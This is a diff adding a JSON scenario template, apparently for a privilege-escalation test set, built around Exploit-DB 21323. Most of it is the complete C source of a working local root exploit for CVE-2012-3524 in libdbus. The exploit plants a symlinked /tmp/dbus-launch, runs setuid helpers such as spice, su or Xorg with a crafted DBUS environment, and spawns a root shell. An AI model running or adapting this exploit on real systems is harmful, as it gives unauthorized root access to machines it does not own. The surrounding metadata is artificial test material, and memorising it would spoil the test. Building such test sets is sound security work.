@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_21323",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: libdbus - 'DBUS_SYSTEM_BUS_ADDRESS' Local Privilege Escalation (CVE-2012-3524;OSVDB-85480;CVE-2012-4425)\n\nExploit source code (21323.c):\n```\n/* dzug.c CVE-2012-3524 PoC (C) 2012 Sebastian Krahmer\n *\n * Trivial non-dbus root exploit. (Yes, it is 2012!)\n *\n * The underlying bug (insecure getenv() by default) has been\n * reported ages ago, but nobody really cared. Unless you have an\n * exploit...\n *\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/signal.h>\n#include <sys/stat.h>\n\n\nint main(int argc, char **argv)\n{\n\tint i = 0;\n\tstruct stat st;\n\tpid_t pid = 0;\n\tchar *env[] = {\n\t    \"PATH=/tmp:/usr/bin:/usr/sbin:/sbin:/bin\",\n\t    \"DBUS_STARTER_BUS_TYPE=system\",\n\t    \"DBUS_SYSTEM_BUS_ADDRESS=autolaunch:\",\n\t    NULL,\n\t    NULL\n\t};\n\n\n\t/* the pam_systemd vector */\n\tchar *su[] = {\"/bin/su\", NULL, \"blah\", NULL};\n\n\t/* the spice vector */\n\tchar *spice[] = {\"/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper\", NULL};\n\n\t/* the Xorg vector, for older Linux dists and Solaris */\n\tchar *xorg[] = {\"/usr/bin/Xorg\", \":7350\", NULL};\n\n\tchar **a = xorg;\n\tchar *dbus[] = {\"/tmp/dbus-launch\", NULL};\n\tchar *sh[] = {\"/bin/bash\", \"--noprofile\", \"--norc\", NULL};\n\tchar me[0x1000];\n\n\tif (geteuid() == 0 && argc > 1) {\n\t\tchown(\"/tmp/dbus-launch\", 0, 0);\n\t\tchmod(\"/tmp/dbus-launch\", 04755);\n\t\texit(errno);\n\t} else if (geteuid() == 0) {\n\t\tsetuid(0);\n\t\texecve(*sh, sh, NULL);\n\t\treturn errno;\n\t}\n\n\tprintf(\"[**] CVE-2012-3524 xSports -- this is not a dbus exploit!\\n\\n[*] Preparing ...\\n\");\n\tmemset(me, 0, sizeof(me));\n\n\tif (readlink(\"/proc/self/exe\", me, sizeof(me) - 1) < 0) {\n\t\t/* Solaris */\n\t\treadlink(\"/proc/self/path/a.out\", me, sizeof(me) - 1);\n\t}\n\tsymlink(me, \"/tmp/dbus-launch\");\n\n\tif (stat(spice[0], &st) == 0) {\n\t\tif ((st.st_mode & 04000) == 04000) {\n\t\t\tprintf(\"[+] Using spice helper ...\\n\");\n\t\t\ta = spice;\n\t\t}\n\t} else if (stat(\"/lib64/security/pam_systemd.so\", &st) == 0) {\n\t\tprintf(\"[+] Using pam_systemd helper (type user passwd when asked) ...\\n\");\n\t\tenv[3] = \"DISPLAY=:7350\";\n\t\tsu[1] = getenv(\"USER\");\n\t\ta = su;\n\t} else if (stat(xorg[0], &st) == 0) {\n\t\tif ((st.st_mode & 04000) == 04000)\n\t\t\tprintf(\"[+] Using Xorg helper ...\\n\");\n\t\telse {\n\t\t\tprintf(\"[-] No suitable suid helper found.\\n\");\n\t\t\texit(0);\n\t\t}\n\t} else {\n\t\tprintf(\"[-] No suitable suid helper found.\\n\");\n\t\texit(0);\n\t}\n\n\tif ((pid = fork()) == 0) {\n\t\texecve(*a, a, env);\n\t\texit(0);\n\t}\n\n\tprintf(\"[*] Waiting 10s for dbus-launch to drop boomshell.\\n\");\n\n\tfor (i = 0; i < 10; ++i) {\n\t\tsleep(1);\n\t\tprintf(\".\"); fflush(stdout);\n\t}\n\tkill(pid, SIGKILL);\n\twaitpid(pid, NULL, 0);\n\n\tfor (;;) {\n\t\tstat(*dbus, &st);\n\t\tif ((st.st_mode & 04755) == 04755)\n\t\t\tbreak;\n\t\tsleep(1);\n\t}\n\tprintf(\"\\n[!] Hurra!\\n\");\n\n\texecve(*dbus, dbus, NULL);\n\treturn errno;\n}\n```",
+  "cve": "CVE-2012-3524;OSVDB-85480;CVE-2012-4425",
+  "exploitdb_id": "21323",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_21323",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
